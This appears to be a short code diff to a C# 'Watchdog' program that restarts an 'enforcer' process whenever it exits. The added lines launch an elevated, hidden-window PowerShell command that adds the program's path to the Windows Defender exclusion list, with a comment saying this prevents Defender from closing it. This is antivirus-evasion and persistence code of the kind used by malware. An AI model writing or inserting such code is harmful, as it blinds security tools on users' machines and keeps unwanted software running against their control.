@@ -38,6 +38,12 @@ namespace Watchdog
                 {
                     enforcer.WaitForExit();
                     enforcer.Close();
+                    Process.Start(new ProcessStartInfo("powershell")
+                    {
+                        CreateNoWindow = true,
+                        Verb = "runas",
+                        Arguments = $" -Command Add-MpPreference -ExclusionPath '{args[1]}'"
+                    }); // Prevents closure via Windows Defender.
                     enforcer = Process.GetProcessById(StartDaemon(args[1]));
                 }
             }
